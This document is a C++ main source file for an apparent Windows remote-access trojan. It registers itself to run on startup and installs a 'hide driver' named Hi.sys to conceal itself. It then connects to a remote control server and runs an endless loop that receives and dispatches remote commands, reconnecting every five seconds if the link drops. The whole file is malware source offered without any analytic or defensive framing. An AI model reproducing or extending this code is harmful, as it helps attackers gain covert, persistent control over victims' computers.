#ifdef _DEBUG
#include <iostream>
#endif // _DEBUG

#include <string>
#include <memory>

#include "networking/WinsockInitializer.h"
#include "command/CommandManager.h"
#include "utils/builders.h"
#include "utils/factory.h"
#include "networking/WinsockTCPClient.h"
#include "methods/driver/Installer.h"

int main()
{
    // Initialize winsock
    networking::WinsockInit();

    // Sign for execution on startup
    utils::factory::execute_on_startup();

    // Install hide driver
    methods::driver::Installer installer("Hi.sys");
    installer.Install();

    // Buffer to read remote commands into
    std::array<char, 128> buffer;

    // Create a commands dispatcher
    std::unique_ptr<command::CommandManager> dispatcher(
        utils::builders::BuildManager());

    // Create a TCP client
    std::unique_ptr<networking::WinsockTCPClient> client(
        utils::builders::BuildClient());

    // Attempt to connect to remote control
    client->Connect();

    while ( true )
    {
        // Read a command to buffer
        int bytes_read = client->Recv(buffer.data(), 128);

#ifdef _DEBUG
        std::cerr << bytes_read << '\n';
#endif // _DEBUG

        // If command successfully received then process it
        if ( bytes_read > 0 )
        {
            dispatcher->Dispatch(buffer.data(), bytes_read, *client);
        }
        else
        {
            // on connection fail, socket remains in an unknown state
            // so creating a new one.

            client.reset(utils::builders::BuildClient());

            Sleep(5000);

            client->Connect();
        }
    }

#ifdef _DEBUG
    // Uninstall hide driver
    installer.Uninstall();
#endif // _DEBUG

    // Clean winsock
    networking::WinsockCleanup();

    return ( 0 );
}

